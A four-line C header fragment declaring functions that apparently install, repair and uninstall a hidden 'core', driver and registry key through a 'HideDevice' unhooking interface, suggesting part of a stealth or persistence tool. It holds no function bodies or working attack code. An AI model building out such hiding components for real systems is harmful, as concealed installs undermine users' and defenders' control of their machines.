extern BOOL DFFixCore(HideDevice *pdev_unhook, unsigned char *core_name, unsigned char *core_path, unsigned char *reg_key_name, BOOL only_key);
extern BOOL DFFixDriver(HideDevice *pdev_unhook, WCHAR *drv_path);
extern BOOL DFFixFile(HideDevice *pdev_unhook, WCHAR *src_path);
extern BOOL DFUninstall(HideDevice *pdev_unhook, unsigned char *core_path, unsigned char *reg_key_name);